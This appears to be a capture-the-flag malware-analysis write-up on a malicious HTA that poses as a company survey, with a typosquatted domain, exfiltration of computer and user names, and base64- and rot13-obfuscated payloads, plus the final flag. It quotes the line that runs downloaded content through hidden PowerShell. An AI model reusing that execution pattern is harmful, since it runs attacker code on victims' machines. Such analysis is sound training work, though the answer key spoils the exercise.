# Malware Analysis - Malhare.exe

## What is the title of the HTA application?
<img width="566" height="89" alt="image" src="https://github.com/user-attachments/assets/9b55007e-6dbb-4502-88a3-8474dd0672b2" />

```
Best Festival Company Developer Survey
```
## What VBScript function is acting as if it is downloading the survey questions?
<img width="831" height="265" alt="image" src="https://github.com/user-attachments/assets/2e9e2632-3de7-4c0f-99ea-320849109d6a" />

```
getQuestions
```
## What URL domain (including sub-domain) is the "questions" being downloaded from?
<img width="831" height="136" alt="image" src="https://github.com/user-attachments/assets/1f5aab1b-311f-4545-8f9e-55590c9b9dc0" />

```
survey.bestfestiivalcompany.com
```
## Malhare seems to be using typosquatting, domains that look the same as the real one, in an attempt to hide the fact that the domain is not the inteded one, what character in the domain gives this away?
```
i
```
## Malicious HTAs often include real-looking data, like survey questions, to make the file seem authentic. How many questions does the survey have?
<img width="881" height="580" alt="image" src="https://github.com/user-attachments/assets/bd4d0c8c-34d9-40f4-a1bf-577910bd2790" />

```
4
```
## Notice how even in code, social engineering persists, fake incentives like contests or trips hide in plain sight to build trust. The survey entices participation by promising a chance to win a trip to where?
<img width="882" height="233" alt="image" src="https://github.com/user-attachments/assets/f8e8d1a4-3651-4c4d-97c9-1be4321f30bd" />

```
South Pole
```
## The HTA is enumerating information from the local host executing the application. What two pieces of information about the computer it is running on are being exfiltrated? You should provide the two object names separated by commas.
<img width="882" height="171" alt="image" src="https://github.com/user-attachments/assets/eb608fdd-83ba-42a1-8b8f-9f36df997fba" />

```
ComputerName,UserName
```
## What endpoint is the enumerated data being exfiltrated to?
<img width="882" height="171" alt="image" src="https://github.com/user-attachments/assets/3a99d747-ff00-4f28-8ea5-068cac343839" />

```
/details
```
## What HTTP method is being used to exfiltrate the data?
```
GET
```
## After reviewing the function intended to get the survey questions, it seems that the data from the download of the questions is actually being executed. What is the line of code that executes the contents of the download?
<img width="882" height="171" alt="image" src="https://github.com/user-attachments/assets/024150e6-c868-48eb-b6c5-f661b111d1fd" />

```
runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False
```
## It seems as if the malware site has been taken down, so we cannot download the contents that the malware was executing. Fortunately, one of the elves created a copy when the site was still active. Download the contents from here. What popular encoding scheme was used in an attempt to obfuscate the download?
<img width="1039" height="679" alt="image" src="https://github.com/user-attachments/assets/930fd352-5694-40a0-9939-99a115425383" />

```
base64
```
## Decode the payload. It seems as if additional steps where taken to hide the malware! What common encryption scheme was used in the script?
<img width="615" height="408" alt="image" src="https://github.com/user-attachments/assets/2576bfbd-478d-4534-b931-29c5ba7ba6ad" />

```
rot13
```
## Either run the script or decrypt the flag value using online tools such as CyberChef. What is the flag value?
<img width="1270" height="447" alt="image" src="https://github.com/user-attachments/assets/05be9109-34ac-4f8d-8378-789afc1e92e4" />

```
THM{Malware.Analysed}
```
